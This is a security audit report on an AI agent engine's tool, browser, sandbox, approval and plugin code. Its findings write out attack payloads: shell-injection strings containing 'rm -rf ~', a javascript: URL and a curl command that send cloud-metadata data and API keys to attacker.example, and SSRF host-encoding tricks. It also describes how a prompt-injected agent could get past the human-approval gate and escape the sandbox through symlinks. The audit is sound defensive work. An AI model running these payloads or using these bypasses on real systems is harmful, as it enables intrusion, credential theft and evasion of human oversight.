# v0.2.0-wayland-base Security Audit

**Run:** 2026-05-15
**Commit:** 071c410 (engine main; merge of W8c.3 wayland-ijfw + capability flips + integration docs; tag v0.2.0-wayland-base)
**Reviewer:** general-purpose subagent (adversarial mindset)
**Scope:** read-only review of new Wave-3 surfaces — wcore-browser policy, wcore-cua policy, ApprovalBridge HITL, plugin discovery + capability flags, shell invocation safety, tool path/vfs validation, secrets handling, MCP trust, Cargo.lock CVE spot-check, capability tampering.

---

## Threat-model summary

Attacker is an **LLM-controlled agent or a malicious in-tree plugin** with:
- Ability to invoke any registered tool with arbitrary JSON-shaped input (because the LLM can write any string the tool schema accepts).
- Access to anything the host (Electron/AionUI) decides to expose over the JSON stream protocol — including the ability to send well-formed `ApprovalResume` commands.
- Read/write to the local filesystem at the OS-user permission level once a Bash/Edit/Write tool succeeds.
- Compile-time presence in the workspace (any crate vendored as a dep can `inventory::submit!` itself as a plugin).

We are NOT modelling attacks from outside the local process. We ARE modelling: prompt-injection that turns the model into an attacker; a hostile MCP server; a third-party plugin crate someone vendored as a dep; an LLM that produces shell-metacharacter-laden tool input.

The bar is "no concrete plausible bypass with a code-level reproducer." Theoretical concerns are filed as INFORMATIONAL.

---

## Findings (severity-ordered)

### BLOCKER #1: Git tool — shell injection via `cwd`, `path`, `paths[]`, `name` parameters

- **Location:** `crates/wcore-tools/src/git.rs:117-211`
- **Attack:** The Git tool builds shell command strings by `format!`-interpolating user-controlled parameters into a `sh -c <string>` invocation. Only the `commit` op's `message` field is shell-escaped (single-quote escape via `replace('\'', "'\\''")`, line 181). Every other op interpolates raw:
  - `cwd` (every op, e.g. line 119: `format!("cd '{cwd}' && git status ...")`)
  - `path` for `diff` (line 127), `blame` (line 144)
  - `paths[]` for `add_paths` (line 164-167 — wraps each in single quotes but does NOT escape embedded `'`)
  - `name` for `branch_checkout` (line 201)
  - `cwd` is read on `execute_with_ctx` (line 242) but only `ctx.vfs.exists()` is checked, NOT escaped.
  - LLM can call `Git { op: "status", cwd: "'; rm -rf ~; '" }` and `format!` produces `cd ''; rm -rf ~; '' && git status ...` — full RCE under the running user's OS account.
  - For `add_paths`: `paths: ["a'; rm -rf ~; '"]` → `git add 'a'; rm -rf ~; ''` — same RCE.
- **Impact:** Arbitrary code execution as the local user. The OS-level capability is whatever the running CLI process has — full filesystem, env vars (including the very API keys loaded into the same process), network. Trust-boundary completely bypassed for a tool the LLM can call with no extra confirmation.
- **Mitigation:** Stop building shell command strings. Use `tokio::process::Command::new("git")` directly with `.arg(arg)` per parameter. The `cd` ergonomic should become `.current_dir(cwd)`. Where `wcore_config::shell` is required for cross-platform shell selection, audit that helper for argv-mode invocations only. This is a `wcore_config::shell` API gap — `shell_command_builder` currently *only* offers `sh -c <str>`-style invocation (see BLOCKER #2). Add an argv-mode helper.

---

### BLOCKER #2: `wcore_config::shell::shell_command_builder` only offers shell-string mode

- **Location:** `crates/wcore-config/src/shell.rs:24-29`
- **Attack:** The single helper `shell_command_builder(command_str: &str)` runs `Command::new("sh").arg("-c").arg(command_str)` (or `cmd /C` on Windows). The Bash tool (`crates/wcore-tools/src/bash.rs:130`) feeds LLM-supplied input straight in via this builder; the Git tool also routes through `shell_command()` (`crates/wcore-tools/src/git.rs:212`). There is no argv-mode alternative — so every caller that goes through the "central shell helper" (per AGENTS.md "Centralize Platform Differences") is forced into shell-interpreted strings.
- **Impact:** The architectural rule that "all shell goes through `wcore_config::shell`" actively pushes callers toward shell injection. BashTool is intentionally a shell — that's expected. GitTool's use is NOT intentional shell — `git` is a binary, the args should never be shell-interpreted. The helper's API shape is the load-bearing cause of BLOCKER #1.
- **Mitigation:** Add `shell_argv(program: &str, args: &[&str])` / `command_builder(program: &str)` to `wcore_config::shell`. Migrate `GitTool` to argv mode. Keep `BashTool` on the shell-string mode (its semantics require it). Update AGENTS.md so the "all shell" rule disambiguates "shell" (=sh/cmd interpreter) from "exec'd binary."

---

### BLOCKER #3: BrowserPolicy is one-shot — redirects to metadata endpoint are NOT re-checked

- **Location:** `crates/wcore-browser/src/tool.rs:91-109` (only Navigate's *initial* URL is policy-checked), `crates/wcore-browser/src/policy.rs:82-162` (no post-redirect check). The `policy_check` is called once before dispatching the op to the provider (`tool.rs:182`).
- **Attack:** Attacker hosts `https://attacker.example/redirect` that returns `302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/`. The LLM is told (via prompt injection in a page it already read) to navigate to `https://attacker.example/redirect`. The policy approves the initial URL (`attacker.example` isn't on any block list, not RFC 1918, not loopback). The browser backend (Camoufox/chromiumoxide) follows the redirect — which uses the same TCP socket / browser process — and lands on `169.254.169.254`. The metadata response is read into the ARIA tree / page content and returned to the model. AWS IAM creds exfiltrated.
- **Impact:** Cloud-metadata exfiltration. SSRF to internal services. The whole point of the RFC-1918 / metadata block list is bypassed by any 3xx redirect from any allowed origin.
- **Mitigation:** Either (a) install a request-interception layer in the browser backend that re-evaluates `BrowserPolicy` on every navigation (including redirects, iframes, fetch), and abort on deny; or (b) tell the backend to disable redirect following and surface each hop as a separate Navigate op that goes through the policy. Per-hop policy enforcement is the right answer — request interception is what playwright/CDP supports first-class.

---

### MAJOR #4: BrowserPolicy — scheme allow list is `file://`-only; `javascript:`, `data:`, `blob:` pass through

- **Location:** `crates/wcore-browser/src/policy.rs:103-108`
- **Attack:** `policy.check_url("javascript:fetch('http://169.254.169.254/').then(r=>r.text()).then(t=>fetch('https://attacker.example/?x='+btoa(t)))")` → `PolicyOutcome::Allow`. The Navigate op runs in the browser; if the backend honors the scheme (chromiumoxide does for `data:`, conditionally for `javascript:`), the script executes in the page context and bypasses every same-origin/network policy the tool layer thought it enforced. Similarly `data:text/html,<script>...</script>` runs arbitrary attacker JS in an opaque-origin frame that can `fetch()` any URL the browser hasn't been told to block at the network layer.
- **Impact:** Same as redirect bypass — SSRF/metadata exfil/internal-network probing — but reachable in one op rather than two.
- **Mitigation:** In `BrowserPolicy::evaluate`, scheme-check with an allow-list (`http`, `https` only) rather than a deny-list. Anything else → `Deny`. The tool's stated surface ("No JavaScript evaluation" — `tool.rs:134`) is currently a contract the policy doesn't enforce.

---

### MAJOR #5: BrowserPolicy — URL embedded host edge cases (`@`, `#`, octal, decimal-overflow IP)

- **Location:** `crates/wcore-browser/src/policy.rs:111-159`
- **Attack:** `url::Url::parse` does handle most of the edge cases — `http://localhost@evil.com/` parses with host=`evil.com`, which is correct and *not* exploitable here. BUT `IpAddr::from_str` accepts dotted-decimal only — it rejects octal-prefixed (`0177.0.0.1`) and hex (`0x7f.0.0.1`), so those parsed-as-non-IP strings fall through `blocked_host_reason` and are NOT blocked. The browser engines, however, accept these forms and resolve them to `127.0.0.1`. Probe:
  - `http://0177.0.0.1/` → `IpAddr::from_str("0177.0.0.1")` → `Err`. `host_lc` is `"0177.0.0.1"`, doesn't match `"localhost"`. Falls through. `PolicyOutcome::Allow`. Browser navigates to 127.0.0.1.
  - `http://0x7f000001/` (32-bit hex) → same outcome. Allow → 127.0.0.1.
  - `http://2130706433/` (decimal-IP) → same outcome. Allow → 127.0.0.1.
- **Impact:** Loopback / RFC-1918 bypass via legacy IP encodings that the Rust `IpAddr` parser rejects but the browser/curl/most HTTP stacks accept. Same threat model as BLOCKER #3 — SSRF to localhost services.
- **Mitigation:** Parse the host through a stricter normalizer that recognizes octal/hex/decimal-IPv4 forms. Either reject any host that fails the `[a-zA-Z][a-zA-Z0-9-]*(\.[a-zA-Z][a-zA-Z0-9-]*)+` shape *and* `IpAddr::from_str`, or canonicalize via `idna::domain_to_ascii` + a hand-rolled "is this a legacy-IPv4-encoding" check. Best: actually resolve DNS / canonical-IP *yourself* and re-check before passing the URL to the backend.

---

### MAJOR #6: BrowserPolicy — IPv4-mapped IPv6 and IPv6 metadata bypass

- **Location:** `crates/wcore-browser/src/policy.rs:202-216`
- **Attack:** The IPv6 arm of `blocked_host_reason` only checks `is_loopback()`, ULA (`fc00::/7`), and link-local (`fe80::/10`). It does NOT check IPv4-mapped IPv6 (`::ffff:0:0/96`), nor the IPv4-translated form (`::ffff:169.254.169.254` → represents `169.254.169.254`). The browser stack typically dual-stacks these.
  - `http://[::ffff:169.254.169.254]/` → parsed as IPv6 by Rust. `v6.is_loopback()` false. Not ULA. Not link-local. Falls through. `PolicyOutcome::Allow`. Browser hits the AWS metadata endpoint via dual-stack.
  - Same for `http://[::ffff:127.0.0.1]/` (loopback).
- **Impact:** Bypass of the metadata / loopback / RFC 1918 block lists via IPv4-mapped IPv6 literal.
- **Mitigation:** In the IPv6 arm, call `v6.to_ipv4_mapped()` (stable on modern Rust); if it returns `Some(v4)`, re-run the v4 block-list checks against `v4`. Also add explicit blocks for `2001:db8::/32` (documentation, harmless) — actually skip that; what matters is `::ffff:0:0/96` mapping.

---

### MAJOR #7: BrowserPolicy — IDN homograph not normalized

- **Location:** `crates/wcore-browser/src/policy.rs:111-159`, `origin_matches` at 223
- **Attack:** `url::Url::parse` converts an IDN like `gооgle.com` (with Cyrillic `о`) to Punycode (`xn--ggle-55da.com`) — so the host string the policy sees IS the punycode form, not the visually-deceptive one. That's fine. BUT: the `denied_origins` / `allowed_origins` patterns are exact-suffix string compares. If a host configures `allowed_origins: ["*.bank.com"]`, an attacker can register `xn--bank-ld8a.com` (`bаnk.com` with Cyrillic `а`) and pass *visual* inspection in the host's UI. The policy doesn't normalize the pattern OR the host through any kind of confusable-script check.
- **Impact:** Phishing-class bypass when the allow-list is shown to humans for review (HITL flow with Suspend) — the visible URL says `bank.com`, the punycode-resolved URL says `xn--bank-ld8a.com`, which doesn't match `*.bank.com`. Practically: only an issue if the host UI renders the raw punycode rather than displaying both forms.
- **Mitigation:** Reject any host with non-ASCII codepoints in the pattern. For host strings, after `url::Url::parse` you already have punycode; surface the punycode literally in `ApprovalRequired` / `Suspend` events so the host UI can show both forms.

---

### MAJOR #8: CuaPolicy — `mark_app_seen` is never called in production code

- **Location:** `crates/wcore-cua/src/policy.rs:92-97` (declaration), all call sites visible only in tests (`policy.rs:239`, `tests/policy_test.rs:49`). `grep -rn mark_app_seen crates/ --include='*.rs'` returns four matches — three test files plus the declaration. No production caller wires up the host's "approval succeeded → record app as seen" path.
- **Attack:** When `first_time_per_app_approval: true` (the *serde-deserialized* default — see MAJOR #9 below), every op on every app routes to `Suspend` forever. The host approves, the op runs once, but the policy state never updates. Next op on the same app → another `Suspend`. This is a denial-of-service against the agent itself when CUA is configured-on. The bypass direction is the inverse: if a user sets `first_time_per_app_approval: false` to escape the loop, ALL apps skip the first-time gate forever — including Keychain Access, password managers, etc.
- **Impact:** The "first-time approval per app" contract is non-functional. The advertised threat-mitigation does not exist at runtime.
- **Mitigation:** When `ApprovalBridge::resolve(token, ApprovalOutcome { approved: true, .. })` lands on a CUA-originated Suspend, look up which app-id triggered the suspend and call `policy.mark_app_seen(app_id)`. This requires the bridge to carry per-token context (which it doesn't today — see MAJOR #11).

---

### MAJOR #9: CuaPolicy — `Default::default()` and `serde(default)` disagree on `first_time_per_app_approval`

- **Location:** `crates/wcore-cua/src/policy.rs:42-66`
- **Attack:** `CuaPolicy` has `#[derive(Default)]`. The struct field is `pub first_time_per_app_approval: bool` with `#[serde(default = "default_true")]`. So:
  - `CuaPolicy::default()` (Rust trait) → `first_time_per_app_approval = false`.
  - `toml::from_str("")` (serde missing-field) → `first_time_per_app_approval = true`.
  - The `permissive()` constructor also sets it false.
  - Most call sites that construct `CuaPolicy { ..Default::default() }` accidentally turn the gate OFF; only the config-file-loaded path enables it.
- **Impact:** Production paths that construct `CuaPolicy::default()` (e.g., test scaffolding accidentally promoted; programmatic policy construction in plugin shells) silently disable first-time approval. The architecturally-advertised default (`= "default_true"`, line 60) is unreachable from `Default::default()`.
- **Mitigation:** Implement `Default` manually so it matches the serde default. Add an integration test that locks `CuaPolicy::default().first_time_per_app_approval == true`.

---

### MAJOR #10: CuaPolicy — forbidden key combos compared with exact-equality only; trivially bypassed by reordering modifiers

- **Location:** `crates/wcore-cua/src/policy.rs:117-126`
- **Attack:** `for combo in &self.forbidden_key_combos: if combo.eq_ignore_ascii_case(keys) ...`. The match is exact case-insensitive string equality. Probe:
  - Policy: `forbidden_key_combos = ["cmd+q+system"]`.
  - LLM emits `CuaOp::Key { keys: "system+cmd+q" }` → bypass.
  - LLM emits `CuaOp::Key { keys: "Cmd-Q-System" }` (hyphens, not pluses) → bypass.
  - LLM emits `CuaOp::Key { keys: " cmd+q+system " }` (leading space) → bypass.
  - LLM emits two separate `Key` ops (`"cmd"` then `"q+system"`) — the policy is per-op, no combined-state check.
- **Impact:** The forbidden-key-combo list provides no defense in depth — any reordering, separator change, or whitespace bypasses it.
- **Mitigation:** Canonicalize key strings before comparison. Tokenize on `+`/`-`/whitespace, lowercase, sort tokens, rejoin. Reject ops whose canonical form contains every token of a forbidden combo (substring-on-canonical, not equality).

---

### MAJOR #11: CuaPolicy — no key-combo gate on `CuaOp::Type` (literal text injection)

- **Location:** `crates/wcore-cua/src/policy.rs:117-126`, `crates/wcore-cua/src/op.rs:62`
- **Attack:** `CuaOp::Type { text: "rm -rf ~\n" }` is processed by the policy ONLY through the app-id gate; the `forbidden_key_combos` check is gated on the `CuaOp::Key` variant (line 118: `if let CuaOp::Key { keys, .. } = op`). So if a Terminal app has been first-time-approved (or `first_time_per_app_approval` is off), the LLM can `Type` arbitrary shell into it. Same for typing `<script>` into a browser address bar, typing OS keyboard-shortcuts as text into a Run dialog, etc.
- **Impact:** Once any app is in the seen set, the LLM has full keystroke control over it with no per-action gating. Type lets the LLM bypass forbidden_key_combos by spelling out characters one at a time (no modifier required to type `r m space - r f`).
- **Mitigation:** Add a `forbidden_typed_substrings: Vec<String>` to `CuaPolicy` and check it on `CuaOp::Type`. Add a hard "no typing into Terminal/cmd.exe/powershell-class windows" rule keyed on frontmost-app id. Better: a per-app whitelist of "allowed types of input" — typing into Terminal is forbidden, typing into a Notes app is fine. (This is hard, partial mitigations are still net-positive.)

---

### MAJOR #12: ApprovalBridge — no per-token authorization; tokens auto-resolve by anyone who can send the JSON command

- **Location:** `crates/wcore-agent/src/approval.rs:41-61`
- **Attack:** The token is a v4 UUID — cryptographically random, not predictable (good). But anyone who receives the `ApprovalRequired` event (which is emitted to the JSON stream protocol — line 403 in `output/protocol_sink.rs`) can call back with `ApprovalResume { resume_token, approved: true }`. The token is the bearer credential — there's no concept of "which side issued this" or "is the resolver authorized." A malicious plugin that subscribes to protocol events (or any tool that captures stdout — `Bash echo $TOKEN`) can lift the token and immediately resolve it with `approved=true`.
- **Concrete path:** Tool A asks for approval. The token is emitted to stdout via ProtocolSink. Tool B (BashTool) runs `tee /tmp/log` simultaneously, sees the token, then runs another tool that posts back via some host plugin (e.g., wayland-ijfw's `ijfw_run` could be wired this way). Approval auto-resolves without the human ever seeing the prompt.
- **Impact:** HITL gating is bypassable from within a single agent session by any tool that can (a) read tool output / sink-emitted JSON and (b) write to the bridge. The tool layer doesn't have first-class "write to ApprovalBridge" — the host does — but compromised hosts or plugins that proxy through the host trivially bypass it.
- **Mitigation:** (a) Don't emit the resume token to stdout. The host can hold an opaque handle that ApprovalRequired references by call_id only; ApprovalResume sent back over the host's own private channel resolves it. (b) Or: require the resolver to prove origin (HMAC signed by a per-session key kept out of the LLM/tool reach). Practical: option (a) is the right fix — the token only needs to flow human→engine, not engine→stdout-visible-to-tools.

---

### MAJOR #13: SandboxedFs — `fallthrough_reads: true` skips containment for read/exists/list/metadata; symlink-out is not detected

- **Location:** `crates/wcore-tools/src/vfs.rs:160-283`
- **Attack:**
  1. The `fallthrough_reads: bool` flag, when true, makes `read`, `exists`, `list`, `metadata` skip `self.contain(path)` entirely (`vfs.rs:247-282`). A sub-agent supposedly clamped to its workspace can `Read("/etc/passwd")` and the read goes through unchanged. The doc comment justifies this ("Reads can either be sandbox-locked (default) or fall through to RealFs when the host advertises `fallthrough_reads: true`") but the host might flip this for performance and silently widen the breach.
  2. The `contain()` function (line 188-204) uses LEXICAL normalization (`lex_normalize`, line 224-243). It strips `..` segments but does NOT resolve symlinks. If the sandbox root is `/tmp/agent-a/` and the attacker (or a prior agent step) places a symlink `/tmp/agent-a/escape -> /etc`, then `contain("/tmp/agent-a/escape/passwd")` lex-normalizes to `/tmp/agent-a/escape/passwd`, which starts with `/tmp/agent-a/`, so it's accepted. The actual fs read follows the symlink and returns `/etc/passwd`.
  3. The "canonicalize the longest existing prefix" fallback (`canonicalize_existing_prefix`, line 207-222) is only consulted *if* the lex-normalized path does NOT already start with `self.root` — so the symlink-out bypass takes the fast path and never gets canonicalized.
- **Impact:** Sub-agent sandbox escape via symlink. Any sub-agent that can `Write` inside its sandbox (which is the whole point) can plant the symlink, then `Read` outside it. Even without write — if the parent agent ever creates a symlink anywhere under the sub-agent's root, the sub-agent inherits the escape.
- **Mitigation:** (a) Always run `fs::canonicalize` on the candidate path FIRST and require the canonical form to start with the canonical root — not as a fallback, as the primary check. Lex-normalization is only a hint for paths-that-don't-exist-yet, and even then the *parent* must canonicalize. (b) Remove `fallthrough_reads` or make it strictly opt-in per-call rather than a sticky flag.

---

### MAJOR #14: Read/Write/Edit `execute()` (non-vfs path) accepts arbitrary absolute paths

- **Location:** `crates/wcore-tools/src/read.rs:75-159`, `crates/wcore-tools/src/write.rs:69-140`, `crates/wcore-tools/src/edit.rs:79-188`
- **Attack:** The legacy (non-`execute_with_ctx`) path for each of these tools calls `std::fs::read(file_path)` / `std::fs::write(...)` / `std::fs::read_to_string(...)` with whatever absolute path the LLM passed. No `validate_memory_path`-style check, no sandbox check, no traversal rejection. `Read { file_path: "/etc/shadow" }` → returns the bytes (if the OS lets the user read them).
- **Impact:** Top-level agent (the one running `execute()` not `execute_with_ctx`) reads arbitrary host files. The dispatcher in `wcore-agent/src/orchestration/` is responsible for routing to `_with_ctx`; if any path forgets the `_with_ctx` variant, the sandbox is silently off. The legacy `execute()` is supposed to only be called from the top-level agent (no sub-agent sandboxing applies), but the LLM still gets unconstrained filesystem access there.
- **Mitigation:** Always call `_with_ctx` from the agent loop; make the non-ctx `execute()` either delegate or be `#[deprecated]`. Add a default-deny config: the top-level agent shouldn't read outside CWD/$HOME without explicit allow rules.

---

### MAJOR #15: Plugin discovery — `inventory::submit!` accepts any crate; capability flags are name-based

- **Location:** `crates/wcore-agent/src/plugins/loader.rs:30-47`, `crates/wcore-agent/src/output/protocol_sink.rs:32-37`
- **Attack:**
  1. `PluginLoader::discover` walks `plugin_inventory::iter()` — every crate that called `inventory::submit! { &FactoryX as &dyn PluginFactory }` at compile time gets discovered. No signature, no allow-list, no checksum. Any crate added to the workspace can register a plugin; that's by design but undocumented as a trust boundary.
  2. `PluginCapabilitySet::from_loaded(names)` flips `browser_suite=true` iff any loaded plugin reports `name == "wayland-browser"`, and `computer_use=true` iff any plugin reports `name == "wayland-cua"` (lines 32-37). The name is the `PluginFactory::name() -> &'static str` return value, NOT cross-checked against the manifest, NOT signed, NOT validated. A malicious plugin can declare `fn name() -> &'static str { "wayland-browser" }` and the host UI will think the legitimate browser surface is loaded.
  3. The `NamespaceLedger` (`crates/wcore-plugin-api/src/registry/tools.rs:76-96`) prevents two plugins from claiming the same `tool_namespace`. So the malicious plugin can't *also* claim `tool_namespace = "browser"` if `wayland-browser` is loaded — but if `wayland-browser` is NOT loaded, the malicious one wins the namespace AND flips `browser_suite` to true, advertising a capability the engine doesn't actually have. Conversely if `wayland-browser` IS loaded, both register with `name = "wayland-browser"` — the ledger sees two plugins with the same name, and the second one's namespace claim collides only if it claimed the same namespace. If the malicious plugin claims a *different* namespace (or no namespace, by setting `register_tools=false`), it loads silently and the capability set still shows `browser_suite=true` (already true from the real plugin).
- **Impact:** Capability tampering is name-based, not identity-based. Host UI shows trustworthy capability flags that a malicious plugin can spoof. Tool namespacing prevents *some* shenanigans but not name spoofing.
- **Mitigation:** Tie capability flags to a stronger plugin identity — at minimum, check that the plugin's manifest cryptographic checksum matches a known-good value baked into the engine binary. Failing that, validate that `manifest.plugin.name` matches the factory's `name()`. Best: replace name-based capability flipping with manifest-declared capabilities the engine validates against a build-time allow list.

---

### MAJOR #16: API keys persisted in plain TOML with default OS permissions

- **Location:** `crates/wcore-config/src/config.rs:633-681` (resolve_api_key — env, then config file), `crates/wcore-config/src/config.rs:690-700` (`global_config_path` → `~/.config/wayland-core/config.toml`)
- **Attack:** No `chmod 0600` on writes to `~/.config/wayland-core/config.toml`. The only file in the workspace using `0o600` is in `crates/wcore-skills/src/bundled/mod.rs:266-277` (for skill-bundle writes, not auth config). API keys, AWS `secret_access_key` (line 24 of config.rs), GCP OAuth `client_secret` (vertex.rs:347) are stored plaintext. On a multi-user machine, `~/.config` is world-readable by default on most Linux distros (depends on umask). On macOS, `Library/Application Support/` is user-private by default — better, but not enforced by the engine.
- **Impact:** Local-attacker credential theft from a shared machine or a leftover laptop user account.
- **Mitigation:** After writing the config file, call `tokio::fs::set_permissions` to mode `0o600` (Unix) / equivalent ACL on Windows. Refuse to read a config file whose permissions are world-readable, with a clear remediation message.

---

### MAJOR #17: FileHistory digest uses non-cryptographic `DefaultHasher` (64-bit)

- **Location:** `crates/wcore-agent/src/file_history.rs:179-219` (`record_post_write_digest`, `byte_digest`)
- **Attack:** `byte_digest` uses `std::hash::DefaultHasher` (SipHash-1-3, 64-bit, non-cryptographic, with process-randomized seed since stdlib doc says so). The digest is used by `RollbackTool` to detect "external modifications" — if the live file's digest matches `last_engine_write_digest`, no external modification is assumed. A determined attacker who wants to modify a tracked file without tripping the guard can search for a colliding 64-bit digest (2^32 expected work for birthday-style collision). Even at the design-doc-stated invariant ("not cryptographic, only needs to detect bytes changed since last snapshot"), a malicious sub-agent that gains write access can flip a file's content and pad it until the digest matches — bypassing rollback's conflict detection.
- **Impact:** Rollback safety net silently disabled. Not catastrophic on its own, but defeats the audit-trail invariant the FileHistory is meant to provide.
- **Mitigation:** Use SHA-256 (truncated to 16 or 32 bytes if memory matters). `sha2` is already in the workspace dep graph (via rustls). The cost is microseconds per write — irrelevant for tool-call cadence.

---

### MAJOR #18: ApprovalBridge — pending tokens never expire (memory growth + accidental indefinite suspend)

- **Location:** `crates/wcore-agent/src/approval.rs:41-49`
- **Attack:** Every `bridge.request(...)` inserts into the HashMap. If the host never calls `resolve()` (network drop, host crash, malicious host that wants to stall the agent), the entry lives until process exit. A malicious script can issue N approval requests rapidly to grow the map. More importantly, the agent task awaiting `rx.await` never returns. There's no timeout, no `select! { _ = sleep(...) => fail }`, no graceful "approval expired."
- **Impact:** DoS against the agent — a single unresolved approval suspends the entire tool dispatch indefinitely. Memory growth is bounded by the call rate but unbounded in absolute terms.
- **Mitigation:** Add a configurable timeout (default 5 minutes?). On timeout, return `ApprovalOutcome { approved: false, .. }` and remove the entry. Periodically GC dead `oneshot::Sender`s (drop the receiver on the producer side cancels via channel-closed).

---

### MAJOR #19: BashTool result includes raw stdout — secrets in env vars trivially exfiltratable

- **Location:** `crates/wcore-tools/src/bash.rs:65-110`
- **Attack:** `Bash { command: "env" }` → returns every env var (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `BROWSERBASE_API_KEY`, `AWS_SECRET_ACCESS_KEY`, ...) as `ToolResult.content`. The model receives all credentials in its context window; an injection-controlled model can then `Bash { command: "curl -X POST attacker.example -d $ANTHROPIC_API_KEY" }`.
- **Impact:** Credential exfiltration. Trivially reachable from any prompt-injected agent run.
- **Mitigation:** This is fundamentally the BashTool's shape — it's a shell with the agent's environment. The mitigations:
  - (a) Sanitize env before spawning (`shell_command_builder` could `.env_clear()` and add only a whitelist).
  - (b) Filter `ToolResult.content` through a secret-scanning pass (regex against known token prefixes: `sk-ant-`, `sk-`, `AKIA`, `gha_`, etc.).
  - (c) Make BashTool opt-in per session and route through a hook.

---

### MINOR #20: `BrowserPolicy::evaluate` doesn't enforce `default_action=Deny` for IP-literal hosts that aren't on a block list

- **Location:** `crates/wcore-browser/src/policy.rs:111-159`
- **Attack:** With `default_action: Allow` and no allow-list, an IP-literal host (e.g., `http://1.2.3.4/`) bypasses the `denied_origins` suffix-glob (suffix glob matches a hostname suffix, doesn't match raw IPs). If the user configured `denied_origins: ["*.evil.example"]` expecting that to be a deny pattern but didn't switch `default_action` to `Deny`, IPs slip through.
- **Impact:** Misconfiguration class — easy to assume your deny list covers IPs.
- **Mitigation:** Document the precedence rules. Add a config-time validation that warns if `default_action: Allow` with any `denied_origins` set.

---

### MINOR #21: MCP stdio transport — malformed JSON crashes the request loop (DoS by hostile MCP server)

- **Location:** `crates/wcore-mcp/src/transport/stdio.rs:82-109`
- **Attack:** A hostile MCP server can emit `{"id":42,"result":{...malformed...}}\n` to its stdout. `serde_json::from_str(trimmed)` errors → `McpError::Transport` bubbles up. The single in-flight call fails. Subsequent calls succeed (the loop continues). NOT a permanent crash. Slightly worse: if the server emits an unending stream of blank lines, `read_response` loops forever (line 87-108) — the `loop { line.clear(); ... if !trimmed.is_empty() ...}` has no max-iterations guard.
- **Impact:** Per-request DoS / latency injection. Not a confidentiality or integrity breach. Worth noting because the trust boundary for MCP servers is "we trust the configured list."
- **Mitigation:** Cap the blank-line skipping (e.g., max 1024 blank lines before returning Transport error). Add a per-request timeout in the McpManager layer (currently absent).

---

### MINOR #22: Script tool allow-list includes Bash — defeats the "no-recursion / no-shell" intent

- **Location:** `crates/wcore-tools/src/script.rs:37`
- **Attack:** `ALLOW_LIST = &["Read", "Write", "Edit", "Grep", "Glob", "Bash", "RepoMap"]`. The doc claims "Allow-list of tools (no Spawn, no Script-recursion, no MCP, no plugins)" but Bash IS allowed, and Bash IS a recursive shell. So Script can `Bash 'wayland-core --some-other-thing'`. This isn't a NEW vulnerability — Bash already provides full shell. But the audit point: the allow-list is presented as a hardening boundary it doesn't actually provide.
- **Impact:** Documentation/contract drift. The "Safety rails" comment is misleading.
- **Mitigation:** Drop Bash from `ALLOW_LIST` (Script should be read-only-ish), OR update the doc comment to say "Bash is in the list because Script's use case requires it; if you're worried about shell-from-Script, you're already worried about shell-from-the-LLM."

---

### MINOR #23: Hooks register without provenance check; malicious skill markdown can include hook commands

- **Location:** `crates/wcore-skills/src/hooks.rs`, `crates/wcore-agent/src/hooks/`
- **Attack:** Skill markdown files load arbitrary hook definitions from their front matter. A skill markdown vendored from `vendor/ijfw-source/` (which IS a symlink at this stage — see `wayland-ijfw/vendor/ijfw-source`) can include hooks that run shell commands on tool events. The current `include_str!`-at-compile-time path locks the content to the build, BUT the *deployed binary* re-reads the skills from `~/.config/wayland-core/skills/` and the project-local `.wayland-core.toml` skills_dir at runtime (per `crates/wcore-skills/src/loader.rs`). An attacker who plants a `.md` skill file in either path can install a hook that runs on every tool call.
- **Impact:** Persistent post-install RCE if attacker can write to `~/.config/wayland-core/skills/`.
- **Mitigation:** Audit the skill-loader for hook permission gating. Add a "trusted skill source" allow-list. Don't auto-load hooks from skill markdown — require explicit user opt-in.

---

### INFORMATIONAL #24: Cargo.lock — no obviously CVE-flagged versions in spot check

- **Location:** `Cargo.lock`
- Versions checked (modern, no published CVEs against the exact versions as of audit date):
  - `tokio = "1.52.2"` — OK
  - `hyper = "1.9.0"`, `h2 = "0.4.13"` — OK (post-2024 RST-flood fixes)
  - `reqwest = "0.12.28"` — OK
  - `rustls = "0.23.37"` — OK
  - `chromiumoxide = "0.7.0"` — OK
  - `image = "0.25.10"` — OK (decoder fixes in 0.25.x line, ensure no panicking decode paths reach prod)
  - `notify = "8.2.0"` — OK
- `cargo-audit` is not installed locally so this is a manual spot-check only. CI should add `cargo audit --deny warnings` to the workflow.
- **Mitigation:** Add `cargo-audit` to CI. Reference: `taiki-e/install-action` is already used in workflows per AGENTS.md.

---

### INFORMATIONAL #25: `validate_memory_path` is solid but NOT called from the file tools

- **Location:** `crates/wcore-memory/src/paths.rs:167-197`
- The function does: absolute-path check, traversal segment check, null-byte check, minimum depth. Good. But `grep -rn validate_memory_path crates/wcore-tools` returns ZERO matches — none of `read.rs`, `write.rs`, `edit.rs` ever calls it. It's only used internally inside `wcore-memory` for its own subsystem (`memory_path()` callers).
- **Impact:** The function exists as a security primitive but is not enforced for the tools the LLM actually uses. The AGENTS.md mention of "memory module path validation" is accurate-but-narrow.
- **Mitigation:** Either rename/move it (and clarify the scope), or extend its use into the file tools (`Read`/`Write`/`Edit`). The latter is the right answer.

---

### INFORMATIONAL #26: P5 memory partition write-block is a serde-level check only

- **Location:** `crates/wcore-plugin-api/src/manifest.rs:78-87`, `crates/wcore-plugin-api/src/registry/memory.rs`
- Manifest validation rejects `memory_partitions_writable: ["P5"]` at parse time. A plugin that constructs `PluginManifest` programmatically (not via TOML parse) and bypasses `from_toml_str` could in principle add P5 to its writable set. The `ScopedMemoryClient::write` then checks the in-memory set (not the manifest schema) — so a non-TOML-loaded malicious manifest succeeds. The plugin loader only loads manifests from TOML (`MANIFEST_TOML` `include_str!`), so this is mostly theoretical for in-tree plugins. Worth tightening if external-plugin-loading is on the roadmap.
- **Mitigation:** Re-validate manifest in `ScopedMemoryClient::new` (defense in depth).

---

## Coverage gaps (areas I didn't fully audit)

- **Cookie-jar isolation across sub-agents in wcore-browser.** The provider trait mentions cookie-jar isolation per session (`provider.rs:68`) but I didn't verify the backend implementations honor this. With chromiumoxide/Camoufox/Browserbase still being stubs (per task #105 W8c.1.C), this is moot until backends land — but pin a test then.
- **CUA backend implementations.** Per task #109, the CUA backends are not yet wired. The policy is the only enforcement surface today; once real backends land, audit them for `Type` → keystroke injection edge cases (IME, dead keys, OS-level shortcut routing).
- **Cargo.lock CVE deep scan.** Without `cargo-audit` I only spot-checked top-of-tree network/image/parsing crates. A full RUSTSEC sweep would catch transitive issues.
